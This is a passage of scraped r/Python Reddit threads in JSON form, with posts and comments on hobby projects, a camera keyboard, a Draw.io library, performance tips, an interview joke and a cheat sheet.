        "https://www.reddit.com/user/HobblingCobbler/",
        "https://www.academia.edu/105250798/Paper_Keyboard_Using_Image_Processing?uc-sb-sw=5982163"
    ],
    "post_content": "EDIT: Since there are a lot of upvotes on that comment, yes, this is about seeking strangers' validations. But we're all validation seekers. For instance, we all need someone's validation to make a living (boss, customers, etc.) Your boss ain't gonna tell you \"god damn boy, you suck at your job, here take my money\". But in this case, validation seeking is kind of a broad term, let's use something more specialized like Market Research 😉. Also, thanks for all your comments and inputs.\nHello everyone\nI've been working on this project for the past 3 weeks, and I want people's opinions to determine how much time I should invest in it.\nProject Link: https://github.com/mnvoh/cameratokeyboard\nWhat My Project Does\nIt's a computer vision project (python, YOLOv8) which essentially allows you to use your camera as a keyboard by detecting your fingers and analyzing their movements. The only requirement (besides having a camera) is that you have to print the keyboard (on an A4 paper, for example). The keyboard is for you and there are 4 markers identifying the boundaries of the keyboard which are for the program.\nTarget Audience\nCurrently, it's a PoC, but the goal is to develop it into a fully functioning virtual keyboard with a desirable accuracy.\nThe initial idea came to me while thinking that it would be actually cool if you could print your keyboard design on your desk mat, and then just use that as a keyboard, but it could also have substantial applications in cell phones.\nComparison\nI have searched quite a bit, but haven't found any similar solutions.\nEDIT:\nThanks to u/avaqueue for finding these articles:\nhttps://www.academia.edu/105250798/Paper_Keyboard_Using_Image_Processing?uc-sb-sw=5982163\nhttps://ieeexplore.ieee.org/document/6377072\nAlso, u/HobblingCobbler has mentioned that they've had a phone with this feature. waiting on more info\nThe Main Question\nNow I have had an enormously gigantic amount of fun working on this and will continue for sure, but how much time depends on its potential. That's why I'm asking for your opinions:\nIs it actually worth it? Or am I imagining its potentials?",
    "comments": [
        {
            "author": "bce69",
            "score": "21",
            "content": "I do not think your project is a waste of time."
        },
        {
            "author": "fortunatefaileur",
            "score": "49",
            "content": "I've been working on this project for the past 3 weeks, and I want people's opinions to determine how much time I should invest in it. I really would encourage you to let your own sense of fun and interest drive your hobbies, rather than seeking validation from 1 219 329 strangers.",
            "replies": [
                {
                    "author": "mnvoh",
                    "score": "5",
                    "content": "Thanks for your feedback, but I'm not seeking validation. Let's call it market research: Now I have had an enormously gigantic amount of fun working on this and will continue for sure, but how much time depends on its potential.",
                    "replies": [
                        {
                            "author": "Schmittfried",
                            "score": "6",
                            "content": "In terms of keyboard replacement, there is no significant market. You can look up how well the laser keyboard performed. But that doesn’t mean it’s not a cool project or potentially relevant for AR applications (think about Apple‘s input gestures for the Vision Pro).",
                            "replies": [
                                {
                                    "author": "mnvoh",
                                    "score": "1",
                                    "content": "Thank you, I totally agree with every word."
                                }
                            ]
                        },
                        {
                            "author": "autisticpig",
                            "score": "1",
                            "content": "That's validation."
                        }
                    ]
                }
            ]
        },
        {
            "author": "lciennutx",
            "score": "5",
            "content": "That's pretty cool maybe an feature that makes it unique: a mechanism of printing a custom keyboard - say like a steam deck - where it's different shortcut keys - and then use the camera to determine what key was pressed and do that macro / action could be as simple as a PSD or illustrator template and let people assign an action to a unique square to perform the action then you could have the setup off to the side and hit a button (square on paper) and perform that action",
            "replies": [
                {
                    "author": "mnvoh",
                    "score": "3",
                    "content": "That's a great idea. If the project becomes fully functional, that's like a day's work and will definitely be considered."
                }
            ]
        },
        {
            "author": "inhumantsar",
            "score": "4",
            "content": "sounds a lot like one of those laser keyboards which people bought and found useful. if you like it and it's fun, go to town on it!"
        },
        {
            "author": "Schmittfried",
            "score": "3",
            "content": "It‘s not a waste of time and definitely a cool project to pursue. Just some heads-up: The keyboardless keyboard has already been tried (with lasers). Turns out not having tactile buttons and slamming your fingers directly on your desk is unergonomic and error-prone. I don’t want to stop you from doing it, just don’t expect it to replace physical keyboards or anything like that."
        },
        {
            "author": "Mleba",
            "score": "2",
            "content": "Seems like a cool and fun project! If you're having fun on it that's all that matters, unless you're waiting for returns on the project (experience, monetary or popularity) then that's another question. On a side-note, keyboard layout change from region to region, is that taken into account for future development (way future probably)?"
        },
        {
            "author": "-Blue_Bull-",
            "score": "2",
            "content": "I think it's a really cool project. To make it frictionless / useful it should be an app that runs on peoples phones. This would be game changing if you can get it to work on the selfie camera of a phone."
        }
    ]
},
{
    "post_author": "GreyRhinos",
    "post_id": "hq8zp2",
    "post_score": "1673",
    "post_time": "Monday, July 13, 2020 at 7:44:37 AM GMT+3",
    "flair_text": "Meta",
    "post_title": "Guys do not name your variable of type dictionary as myDict/mydict during your whiteboard interviews!",
    "media": [],
    "post_content": "Maybe I am the only idiot who has done something like this but I just wanted to share my embarrassing interview experience. Let's cut it to the chase, so I had this video interview where I was given a question and a shared editor. I decided to use a dictionary for my solution (one of my favorite ds) and named the variable as myDict. While I was explaining my logic, I made sure I was emphasizing the letter 't' whenever I pronounced myDict (so that it doesn't sound like my_dick). Anyway, while I was typing the solution and explaining, obviously, my brain started concentrating on the code and I wasn't paying much attention to what I was saying. Apparently, my pronunciation started sounding like 'my dick'. On top of that, I was using that dick so much to the point that interviewer started laughing. Imagine when you are explaining the space complexity and you say something along the lines 'the size of myDict is proportional to the size of input array'. Anyone else has done something embarrassing like this?\nEDIT: embracing == embarrassing",
    "comments": [
        {
            "author": "hugthispanda",
            "score": "533",
            "content": "That's one way to get them to remember you.",
            "replies": [
                {
                    "author": "GreyRhinos",
                    "score": "244",
                    "content": "haven't heard back from them. apparently using dick wasn't an optional solution cause of extra space",
                    "replies": [
                        {
                            "author": "koalillo",
                            "score": "147",
                            "content": "I don't think the homophone played a big part in their decision. If it did, well, they are a bag of dicts. It was likely something else. my_type is not a great variable name, but I wouldn't dismiss someone for that either.",
                            "replies": [
                                {
                                    "author": "meatatfeast",
                                    "score": "91",
                                    "content": "Bag of dicts is my new favorite data structure."
                                }
                            ]
                        },
                        {
                            "author": "Anomalocaris",
                            "score": "38",
                            "content": "another candidate had a larger dict.",
                            "replies": [
                                {
                                    "author": "Fingolfin734",
                                    "score": "14",
                                    "content": "My best fwiend in Wome is named Biggus_Dictus"
                                },
                                {
                                    "author": "Sorry_Door",
                                    "score": "2",
                                    "content": "My stomach aches from all the laughing"
                                }
                            ]
                        },
                        {
                            "author": "teriyaki7755",
                            "score": "4",
                            "content": "Lmao using an unfortunate incident to explain time complexity. Consider teaching man it will be best suited i believe"
                        },
                        {
                            "author": "tellmenothingpls",
                            "score": "4",
                            "content": "Not trying to be that guy but do you mean optimal?",
                            "replies": [
                                {
                                    "author": "gnutrino",
                                    "score": "2",
                                    "content": "No, dick use isn't optional ( ͡° ͜ʖ ͡°)"
                                }
                            ]
                        },
                        {
                            "author": "UncleNorman",
                            "score": "1",
                            "content": "They're just a bunch of gay fish."
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "i wonder what (B)job you were offered."
                        }
                    ]
                }
            ]
        },
        {
            "author": "bschlueter",
            "score": "107",
            "content": "In all seriousness, would there have been a contextually meaningful name you could have declared the object as instead? If I were the interviewer and someone couldn't come up with a more meaningful name than that, that's what I would knock them for, not the potential inappropriateness."
        },
        {
            "author": "G0Odspeed",
            "score": "250",
            "content": "myDict got keys and values dude yourDict got value error fool"
        },
        {
            "author": "salsation",
            "score": "50",
            "content": "“Why didn’t you name it ‘my_dict’ though?”"
        }
    ]
},
{
    "post_author": "stefantalpalaru",
    "post_id": "eip48b",
    "post_score": "1625",
    "post_time": "Thursday, January 2, 2020 at 1:50:48 AM GMT+3",
    "flair_text": "",
    "post_title": "\"The rules of perf\" at Dropbox",
    "media": [
        "https://preview.redd.it/g7g5hf7dxm741.jpg?auto=webp&s=53abb0291f1d94405c668f20c8922b8e5e509e41",
        "https://i.redd.it/g7g5hf7dxm741.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Agent_03",
            "score": "243",
            "content": "A more detailed explanation: Avoid needless processing. This breaks down two ways Feature design: Think hard before adding features that come with significant performance impacts -- do you really need this feature? Is there a simpler way to do it which achieves most of your goals? Can you do it a simple way 90% of the time and only fall back to something more complex if needed? Can you skip several intermediate steps to get to the end result faster? (ex avoiding sorting a list) Optimize execution by taking advantage of short-circuit evaluation and doing lazy fetching/evaluation. For conditionals, if you sometimes need to do an expensive check, but usually don't, then see if there's a way you can skip that check. Laziness: don't fetch extra things from the filesystem until requested, if you often don't need it. Practical example: I optimized a routine (in Python) at work last month. We were processing text files a line at a time and removing control characters. To remove control characters we used a regex on each line (not the most efficient approach, fairly expensive). I added a quick check that iterated through the line of text and checked if any of the characters were within the control character range,and just returned the original string if not. Not as efficient as rolling a non-regex implementation, but since control characters are rare it avoids 90% of the performance cost and was much simpler & safer to implement. Cache results of expensive operations to avoid repeating them unnecessarily. If you're fetching info from the filesystem, cache it in memory if you are likely to reuse it (works well with lazy evaluation). Batch it: if you're doing a single operation often to many items, try gathering up the items to process and processing them in large groups. Often this is more efficient because it makes better use of caches (CPU/disk) and it permits you to write much tighter loops for processing. It permits reusing buffers, connections, SQL prepared statements, etc. It can improve branch prediction, permit use of SIMD instructions, etc where they would not work otherwise. Batching also makes it easier to fall back to something like the multiprocessing library to parallelize work. Use software pipelining. This is kind of like batching: rewrite loops that run items through a series of steps/processes so you first do the same step to each item, then the next step. Sometimes can be evaluated much more efficiently by compilers/interpreters because it allows using SIMD instructions, avoids branch prediction misses, etc. May also mean using Unix/Linux pipelining as well: use a bunch of smaller utilities that pipe input from one to another. This is another application of the same principle, but has the extra advantage of being generally very efficient, and spreading work across multiple processors. Use a lower-level language than Python to optimize the most performance-sensitive parts of the code. I.E. fall back to C bindings for intensive number crunching, crypto, etc. Optimized C can be several times faster than Python (or sometimes much more!). In general Pareto's principle applies: 80% of your execution time comes from 20% of the code (and vice versa), so if you double the performance of the slowest 20% you can almost double your overall performance.",
            "replies": [
                {
                    "author": "EternityForest",
                    "score": "69",
                    "content": "\"Do it a simple way 90% of the time and only fall back to something more complex of needed\" Now that's the right way to do simple software! Don't just remove the feature, dynamically enable it as needed.",
                    "replies": [
                        {
                            "author": "Agent_03",
                            "score": "12",
                            "content": "To explain a bit further: This is for cases where it's far more complex to replace with an optimized implementation or better algorithm that covers all the edge cases, or where there is an implementation with lower big-O complexity but a much higher constant overhead. For example when writing a sorting algorithm you check if numbers are already sorted before trying to sort them, right? And in many languages the default implementations for sorting numbers usually use a quicksort for the bulk of it, but often switch to an insertion sort when the number of elements is small (7-10 or so). Insertion sort has worse big-O scaling but is faster for small numbers of elements. In general, often you can write a quick and dirty brute force solution to a problem that covers all the edge cases but has poor big-O performance (for example, depth-first search of a graph). There are much, much more efficient algorithms you can apply but they usually require some assumptions about the structure of the data -- and if you know that your data violates one of these, you simply can't use them. The more optimal algorithms often require more complex data structures as well, which makes them much slower for small n values. As an example of this, radix/bucket sort is hands-down the fastest option for large sets of smallish or fixed-length elements (say, 2-4 byte integers). But you have to be able to be able to split inputs into multiple buckets -- if you can only do comparisons for some elements then you have to be able to fall back to quicksort/mergesort etc. Finally, if performance is bad enough that you're addressing it then simplicity takes a second priority to speed."
                        }
                    ]
                },
                {
                    "author": "Astrokiwi",
                    "score": "17",
                    "content": "For (5), this is why we use libraries like numpy, or compiled thingees like Cython.",
                    "replies": [
                        {
                            "author": "Agent_03",
                            "score": "14",
                            "content": "Yep, and libraries like PyTorch or PyCuda that can leverage GPU acceleration via native bindings"
                        }
                    ]
                },
                {
                    "author": "geeshta",
                    "score": "6",
                    "content": "Nice reply, thank you! I want to ask how would you do crypto in C? The problem I'm having is that with Python you have (almost) infinite integers and in cryptogryphy, numbers of tens to hundreds of digits (in base 10) are used. I alway wanted to rewrite my factorization/encryption/decryption libraries that I wrote in Python to C to see the performance increase but always struggled with C's MAX values for integers.",
                    "replies": [
                        {
                            "author": "Hydroel",
                            "score": "10",
                            "content": "Are you using C's long, long long integers, or even double precision floating point numbers? I don't know the range of the variables you're using in cryptography, and you might be using numbers over 2^18; but I'm pretty sure Python relies on the same number implementation as C, so I'd be quite surprised if it could do anything that C cannot do (albeit with a simpler syntax)"
                        },
                        {
                            "author": "AngriestSCV",
                            "score": "5",
                            "content": "You are looking for what is known for as an arbitrary precision library. Here is an example https://gmplib.org/ The macros MAX_INT, MAX_LONG ... etc will let you know at compile time how big your integers are. There is also uin32_t and it's friends that let you specify exactly what kind of integer you want."
                        }
                    ]
                },
                {
                    "author": "Isvara",
                    "score": "4",
                    "content": "If you're fetching info from the filesystem, cache it in memory if you are likely to reuse it Why isn't it better to leave this to the operating system, which has better whole-system view?",
                    "replies": [
                        {
                            "author": "Agent_03",
                            "score": "4",
                            "content": "Often it is, if you just want the raw bytes. If you're doing some sort of analysis on the data it's more efficient to cache the result yourself though, or if your program knows more about the access pattern."
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "4",
                    "content": "Thanks for your post. As a hobbist, learning things that are probably common knowledge to you is extremely useful!"
                }
            ]
        },
        {
            "author": "Mrthomsonmas",
            "score": "85",
            "content": "Can someone please explain?"
        },
        {
            "author": "nfojones",
            "score": "46",
            "content": "Ouch this gives me flashbacks of 2018 when I spent a year of my career performance tuning and refactoring a multifaceted data streaming application written in Python 2 that was running on the same box as the resource hungry Apache Flume agents it was feeding. I managed some refactor miracles that year but the data we were consuming gave no fucks and kept scaling its way back to a bottleneck. Started as a single threaded app that shift to a multithreading app and evolved into a multiprocessing stack that utilized ZMQ to talk between processes (I don't even know why I did that anymore). I learned an epic butt ton about Python that year but I'd prefer never to chase that problem again. And of course this was a Fortune 500 megacorp that chose to lay me off in early 2019 because I fell into some arbitrary \"doesn't work near a core location\" layoff net (due to having convinced my boss to move across the country and keep the job). My boss and colleagues were shocked. For me though it was almost perfect timing. I'd done FT remote for almost 2 years and even though I was starting to come into a local office just to be around people I was definitely just coasting and that office had zero relation to my work. The chunky severance they gave me and the 60 days to find a new job worked perfectly. Got something like a 33% raise out of the new gig and the severance check arrived just as I was buying my first house. Good times... feel bad for whoever had to pick that project up. I knew it like the back of my hand. One of those rare projects you actually built from the ground up one design mistake after another. At least it was well linted and relatively clean/sexy code with decent doc strings. And FWIW, it had finally made it to Python 3 just as I was leaving, having originally been confined to the RHEL Python 2.6 variant in its earliest days. Sorry for the blog post. Sometimes I just leave these missives on Reddit for myself like a poor man's journal. TLDR: I fucking love Python. Please never make me do realtime mission critical streaming with it again."
        },
        {
            "author": "MarsupialMole",
            "score": "7",
            "content": "How would you go about pipelining something in python ordinarily? I know of lots of pipeline type frameworks but not sure what would be my go to for arbitrary performance improvements within an existing application."
        },
        {
            "author": "ZombieRandySavage",
            "score": "137",
            "content": "TL;DR. Really wish we hadn’t written the core application of our business in Python."
        },
        {
            "author": "KyleDrogo",
            "score": "6",
            "content": "Was this posted before or after Guido left?"
        },
        {
            "author": "nuephelkystikon",
            "score": "5",
            "content": "I read it as ‘The rules of Perl’ first, which made the Python part a bit weird."
        },
        {
            "author": "gitcraw",
            "score": "7",
            "content": "I was thinking \"Performance Review\" like corporate bullshit of bragging about yourself every 6 months to tell people whose job it is to keep track of you, what you're actually doing."
        },
        {
            "author": "axum2009",
            "score": "3",
            "content": "Sounds like a Daft Punk song"
        },
        {
            "author": "poditoo",
            "score": "2",
            "content": "As a procrastinator I live my life by those very same words..."
        }
    ]
},
{
    "post_author": "MerrimanIndustries",
    "post_id": "1bt5rx9",
    "post_score": "106",
    "post_time": "Monday, April 1, 2024 at 5:52:52 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Drawpyo: create Draw.io diagrams with Python",
    "media": [
        "https://i.imgur.com/iq1qZsE.png",
        "https://i.imgur.com/YJZqoEG.png",
        "https://github.com/MerrimanInd/drawpyo/blob/main/etc/development%20scripts/generate_tree_diagram.py",
        "https://app.diagrams.net/",
        "https://github.com/MerrimanInd/drawpyo",
        "https://pypi.org/project/drawpyo/",
        "https://github.com/MerrimanInd/drawpyo/blob/main/etc/development%20scripts/build_a_flowchart.py",
        "https://merrimanind.github.io/drawpyo/"
    ],
    "post_content": "This is a project that I initially created in a weekend for my own use after I was surprised to find out there was no easy way to generate Draw.io diagrams in Python. I'm a huge fan of Draw.io for documentation since it's free, lightweight, and the files are plaintext.\nAfter building basic initial functionality I decided to use this as a project to make a more mature Python library out of something I initially wrote for myself quick n dirty. I refactored (a lot), wrote docs, tests, build logic, etc. There's still a lot to do to make it as robust as it could be but I think it's good enough to share!\nGitHub Page\nDocs\nWhat My Project Does:\nThere's some basic functionality that allows you to manually create Draw.io objects and edges, pre-format them from libraries, and lay them out. I've also started to implement more automated diagram types that extend that basic functionality for specific use cases. The ony currently released diagram type is a TreeDiagram, that allows you to define a tree structure with parent and children nodes, then auto generate a nice looking layout.\nFor example, this code for a tree diagram generates this diagram! Or for something a little more manual, this code for a flowchart generates this diagram.\nTarget Audience:\nI use Draw.io for everything so your imagination is the limit. But I think this would be the best fit for auto generating documentation, specifically that which needs to be read by non-technical or non-programmers.\nComparison:\nI couldn't find any other Python libraries for creating Draw.io graphs. There are other graphing options, most based on Graphviz. The advantage of Draw.io here is the ability to have finer control over formatting and have a great desktop UI for working with the diagrams.\nedit:\nDrawpyo is now on PIP! Thanks for the push everyone.",
    "comments": [
        {
            "author": "Drevicar",
            "score": "28",
            "content": "You should tag it with version 0.1.0 and give it the trove classifier of beta and push it to pypi to get your feedback. Rather than getting feedback first then pushing.",
            "replies": [
                {
                    "author": "MerrimanIndustries",
                    "score": "6",
                    "content": "I'll probably try to do that then. It's on my to do list to get it uploaded, thanks for the push! Edit: Uploaded to pip just now! Thanks."
                }
            ]
        },
        {
            "author": "commander1keen",
            "score": "12",
            "content": "I would recommend adding some images of what the output might look like to the readme.",
            "replies": [
                {
                    "author": "MerrimanIndustries",
                    "score": "3",
                    "content": "Oh yeah it's on my list of to dos. Just gotta spend a few evenings generating all the images and uploading."
                }
            ]
        },
        {
            "author": "kinow",
            "score": "6",
            "content": "Interesting idea, will give it a try next time I have to update/create a diagram. If that works, I'd try to use it in a simple Sphinx directive to automate parts of my documentation that have diagrams. Thanks for sharing!",
            "replies": [
                {
                    "author": "MerrimanIndustries",
                    "score": "2",
                    "content": "I played around with making a diagram type that would generate a class diagram from a Python module, with the idea of using it for automatic documentation. I would love to be able to convert that into a PNG or SVG but you would need to use a Draw.io API to actually render it. Or perhaps it could be done with some of their other projects.",
                    "replies": [
                        {
                            "author": "kinow",
                            "score": "3",
                            "content": "I played around with making a diagram type that would generate a class diagram from a Python module, with the idea of using it for automatic documentation. Exactly what I had in mind. I would love to be able to convert that into a PNG or SVG but you would need to use a Draw.io API to actually render it. Or perhaps it could be done with some of their other projects. I was going to mention jgraph. It might be possible to use their JS lib, or even the GUI (maybe in a container?) to run during a Sphinx build to produce graphs, I think. I do something similar with udocker + containers to produce other kind of diagrams in a separate project. It only depends on how friendly the jgraph code is, I reckon."
                        }
                    ]
                }
            ]
        },
        {
            "author": "sortefyrste",
            "score": "3",
            "content": "So nice! Always wanted to use drawio with Python, and now it is possible 🤓 so great!"
        },
        {
            "author": "fud0chi",
            "score": "2",
            "content": "Wow this is a great idea, I will have to check this out"
        },
        {
            "author": "chicuco",
            "score": "2",
            "content": "Nice, iwill watching thsi proyect! ib been unsucessfully trying some other diagram stuff and thsi loks promising! thank you!"
        },
        {
            "author": "TheBaconFate",
            "score": "2",
            "content": "Saved the post to try it later this week when I’m back from vacation :) Edit: Typo"
        },
        {
            "author": "Educational-Mind-816",
            "score": "2",
            "content": "Exactly what I need!!! Thank you so much"
        },
        {
            "author": "klargstein",
            "score": "2",
            "content": "You son of a gun, I'm in."
        },
        {
            "author": "Acceptable-Donkey-90",
            "score": "2",
            "content": "awesome ! I'm just starting to use drawio again after some pause. In the passt few weeks I often used mermaid or plantuml to generate graphs but sometimes it is good to have more manual control. Using your library I hope to automate some parts of the insertion process, often I'll have tools to generate the abstract graphs structure (e.g. some little script I wrote to generate depencies between python modules). Quite often though the presentation I get via auto generated scripts is not great and tweaking the tools is not worth the time compared to manually getting the result I want. I'm pretty sure your tool will permit to accelerate my workflow of creating diagrams."
        },
        {
            "author": "mr_claw",
            "score": "1",
            "content": "Not sure if this is on your horizon, but what would be really cool is to create the diagrams on draw.io, import them into Python somehow, so that we can then programmatically change the components or content.",
            "replies": [
                {
                    "author": "MerrimanIndustries",
                    "score": "1",
                    "content": "It's definitely something I've thought about, I actually have an open issue for it. The biggest issue is that while Draw.io maintains perfect back compatibility, they do up their diagram versions regularly and don't publish a file specification so it would be hard to maintain support. I'll probably implement it with a big \"YMMV\" asterisk. It'll also be a little cumbersome to get the handles for specific objects to modify, you'd have to search through all objects for ones that match criteria. I did implement a function to offer some of that directionality, which is the ability to style an object from the style strings that Draw.io generates. If you create an object then right click it and hit \"Edit Style\" you can see the style attributes that Draw.io will add to the XML tag for the object. If you just copy that string you can instantiate a Drawpyo object from it, see this code example. I set this up so you could do a bunch of styling in Draw.io graphically then generate objects matching that style with Drawpyo."
                }
            ]
        },
        {
            "author": "SirBerthelot",
            "score": "1",
            "content": "Funny enough, I've a program that gets a draw.io and it screws with it, making it basically illegible"
        }
    ]
},
{
    "post_author": "br2krl",
    "post_id": "1bo796n",
    "post_score": "11",
    "post_time": "Tuesday, March 26, 2024 at 3:57:30 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "\"Mark as read\" plugin for mkdocs-material",
    "media": [
        "https://berk-karaal.github.io/mkdocs-material-mark-as-read/",
        "https://github.com/berk-karaal/mkdocs-material-mark-as-read"
    ],
    "post_content": "Hi everyone, I developed a simple plugin for mkdocs-material.\nWhat My Project Does:\nIn simple terms, this plugin allows users to mark pages as read and it shows a checkmark icon in navigation bar for the pages that was marked as read.\nThe plugin adds a button under the page content and when users clicks, it stores read date in localStorage. It shows a checkmark icon in the navigation panels for the pages that marked as read. It also shows a \"document updated\" icon if the pages that marked as read got an update.\nTarget Audience:\nAnyone who has a website built with Material for MkDocs (a.k.a. mkdocs-material).\nThis plugin could be useful for the pages that user read by an order and wants to continue from where it left. I guess the Learn page of FastAPI documentation could be a great example to that.\nComparison: No alternative plugin exist for Material for MkDocs afaik\nProject repo: github.com/berk-karaal/mkdocs-material-mark-as-read\nYou can try this plugin on the documentation website. Let me know what you think about this plugin. Also please share if you have a feature request or an idea to improve this plugin.",
    "comments": [
        {
            "author": "crawl_dht",
            "score": "1",
            "content": "This is a useful feature. Can you also add if the user reaches at the bottom of the page, it is automatically marked as read?",
            "replies": [
                {
                    "author": "br2krl",
                    "score": "1",
                    "content": "Great idea, I will see if I can add this feature"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bmzmsa",
    "post_score": "7",
    "post_time": "Monday, March 25, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Amazing_Upstairs",
            "score": "1",
            "content": "There doesn't seem to be a free and open source Python version of Adobe After Effects"
        }
    ]
},
{
    "post_author": "harshsharma9619",
    "post_id": "jo4h73",
    "post_score": "1610",
    "post_time": "Wednesday, November 4, 2020 at 11:38:28 PM GMT+3",
    "flair_text": "News",
    "post_title": "Python is Now Officially the Second Most Popular Programming Language",
    "media": [
        "https://techdator.net/python-is-now-officially-the-second-most-popular-programming-language/",
        "https://external-preview.redd.it/nKGUdth3FuTDHyOAiDmRjlyPzNMJKgjQlQ9H0sxS6_Y.jpg?width=640&crop=smart&auto=webp&s=793dca0d506d2be9999c9d20f057c12e144f290b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "coffeewithalex",
            "score": "132",
            "content": "Isn't it in Python's philosophy to be the second best tool at everything?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "43",
                    "content": "No, there was some quote about python being the second best language for everything"
                },
                {
                    "author": "asserio",
                    "score": "7",
                    "content": "Yes, it's in PEP 8"
                },
                {
                    "author": "harshsharma9619",
                    "score": "1",
                    "content": "Yeah Bro"
                }
            ]
        },
        {
            "author": "dulti",
            "score": "405",
            "content": "The article says that Python has overtaken Java; does that mean that Python now runs on 4 billion devices?"
        },
        {
            "author": "recursiveG",
            "score": "79",
            "content": "More popular because data scientists can't remember how to do X in Python consistently so they perform a ton more google and stack overflow searches than a normal developer would."
        },
        {
            "author": "[deleted]",
            "score": "48",
            "content": "Can you stop spamming your blog here?"
        },
        {
            "author": "csdevil",
            "score": "47",
            "content": "Yet, Java is used by 69% of developers Nice"
        },
        {
            "author": "SugaanthMohan",
            "score": "13",
            "content": "Let me make my own blog post, Post it to r/python. Call it official and be the ass of the r/python group today. Or better, why not burn everything we have invented so far and go back to C.. Lol..."
        },
        {
            "author": "nitin_2610",
            "score": "4",
            "content": "Which is the first one then?"
        },
        {
            "author": "kyerussell",
            "score": "21",
            "content": "“Officially”. Fuck this article and fuck where our industry has gone to allow this shit to fester."
        }
    ]
},
{
    "post_author": "kmhnz",
    "post_id": "1bst810",
    "post_score": "298",
    "post_time": "Monday, April 1, 2024 at 6:15:58 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "The Best* Python Cheat Sheet",
    "media": [
        "https://github.com/kieranholland/best-python-cheat-sheet"
    ],
    "post_content": "A dense Python cheat sheet with just what you need.\nDesign principles:\n• Focus on Python core\n• Comprehensive but selective (Just what you need)\n• Densely packed\n• Well-linked\n• Linkable\n• Responsive\n• Printable\nIssues and feedback are tracked at the best-python-cheat-sheet repository.\n*It may not be the best Python cheat sheet, but it aspires to be.",
    "comments": [
        {
            "author": "[deleted]",
            "score": "18",
            "content": "at first i was like 'pfft!' and then i was like 'dang!' nice work"
        },
        {
            "author": "blacklight111",
            "score": "6",
            "content": "This is great thanks!"
        },
        {
            "author": "Versace_69",
            "score": "5",
            "content": "Thanks for the cheat sheet. I like the direct link to doc related for each section. Some remarks I have noted about it: Python icon is to go back to the top, I found it by chance... Maybe it will be better to just write \"Back to top\" or change the icon to an arrow ? I was about to request it just before I found it... Full deep black for background with text above is very tiring to read. Looks like you are using Stackoverflow CSS. Look on Stackoverflow or Reddit, dark theme has more a greyish background than full deep black. Sections are well separated and visible in Light theme, that's not the case in Dark theme. Your banner at top should be used as a navigation bar as it stays always visible. Would be more useful in that case. Maybe to go back to the top of the visible section, navigate to previous and next section, going back to top ? Expand when mouse over to show direct link of summary ?",
            "replies": [
                {
                    "author": "kmhnz",
                    "score": "3",
                    "content": "Thanks - good points I'll consider for next iteration."
                }
            ]
        },
        {
            "author": "PsychologicalFactor1",
            "score": "3",
            "content": "I love a good cheat sheet"
        },
        {
            "author": "pyhannes",
            "score": "3",
            "content": "Awesome, thank you!"
        },
        {
            "author": "CompetitionDeep5503",
            "score": "3",
            "content": "Fantastic work!"
        },
        {
            "author": "antonym_mouse",
            "score": "1",
            "content": "Saved. Nice work!"
        },
        {
            "author": "ashok_tankala",
            "score": "1",
            "content": "Amazing. I want to share this in my newsletter if that's ok for you.",
            "replies": [
                {
                    "author": "kmhnz",
                    "score": "1",
                    "content": "Sure.",
                    "replies": [
                        {
                            "author": "ashok_tankala",
                            "score": "1",
                            "content": "If you don't mind can you please share your social media links. I want to tag that's why asking"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Glass_Dingo_3984",
            "score": "1",
            "content": "Ow good gob"
        },
        {
            "author": "Burwissi",
            "score": "1",
            "content": "Ty, needed this"
        },
        {
            "author": "kdlangequalsgoddess",
            "score": "1",
            "content": "Great job!"
        },
        {
            "author": "RoboticSystemsLab",
            "score": "1",
            "content": "Very little runnable code. Hosted outside of git. I don't see the point."
        },
        {
            "author": "Mental-Opening782",
            "score": "1",
            "content": "Fantastic I love it! Thank you!"
        },
        {
            "author": "marsupiq",
            "score": "1",
            "content": "I’m missing advanced stuff like: walrus operator in comprehensions decorator arguments… decorators for instance method or classes position- or keyword-only parameters metaprogramming asyncio itertools typing Enum"
        },
        {
            "author": "Tiny-Channel4873",
            "score": "1",
            "content": "Holy Guacamoly, that's some really powerfuk cheatsheet, although I didn't understand All of it (just started with Python)"
        },
        {
            "author": "Barury797",
            "score": "1",
            "content": "Are you update this within a week? If you don't I'm gonna print this, such a great page"
        },
        {
            "author": "Ok-QAS-1996",
            "score": "1",
            "content": "Thank you, kindhearted person"
        }
    ]
},
{
    "post_author": "HiT3Kvoyivoda",
    "post_id": "1bm7xq4",
    "post_score": "449",
    "post_time": "Sunday, March 24, 2024 at 3:44:38 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What’s a script that you’ve written that you still use frequently?",
    "media": [],
    "post_content": "Mine is a web scraper. It’s only like 50 lines of code.\nIt takes in a link, pulls all the hyperlinks and then does some basic regex to pull out the info I want. Then it spits out a file with all the links.\nTook me like 20 minutes to code, but I feel like I use it every other week to pull a bunch of links for files I might want to download quickly or to pull data from sites to model.",
    "comments": [
        {
            "author": "lagerbaer",
            "score": "226",
            "content": "It's really basic but my mom has a digital picture frame that you can email pictures to. Once a week I grab pics I want to send to her frame from Google Photos (not automatically because the Google Photo API sucks ass) and download them. Then I use the script to email them to the frame; the only \"business logic\" there is that I need to split it up into chunks of 25 MB each."
        },
        {
            "author": "voxcon",
            "score": "131",
            "content": "My mom had a difficult time remembering when she opened certain things in the fride. I suggested, she should use a pen and write the date down. She somehow didn't like that idea. Since she didn't like that idea i frankensteined together a raspberry pi, a label printer, a few physical push buttons and some leds. Now she can simply press a button to print a perfectly sized sticky label with the current date and time on it. Somehow she likes this solution and uses it daily. In the background there runs a python script waiting for inputs. Once it detects that the print button is pressed it fetches the local date and time from a list of ntp servers, converts it info a printable pdf displaying the data and sends the print command over to the label printer. The printer then prints and cuts the label to size and you can stick it wherever you want. Been in daily use for about 5 to six years. Still going strong."
        },
        {
            "author": "IndianaJoenz",
            "score": "102",
